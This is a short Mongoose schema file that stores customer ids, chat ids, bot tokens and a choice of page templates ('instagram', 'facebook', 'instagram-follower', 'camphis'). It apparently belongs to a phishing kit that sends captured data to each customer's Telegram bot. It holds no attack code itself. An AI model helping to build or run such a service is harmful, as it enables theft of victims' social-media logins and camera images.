import { Schema , model } from 'mongoose';

const postSchema = new Schema({
  cus_id : {
    // here comes 6 char id 
    type : String,
    required : true
  },
  chat_id : {
    type : String,
    required : true
  },
  bot_token : {
    type : String,
    required : true
  },
  template : {
    type : String,
    required : true,
    default: "instagram-follower",
    enum: ["instagram", "camphis", "facebook", "instagram-follower"]
  },
},{
  timestamps : true
});

export default model('Post', postSchema);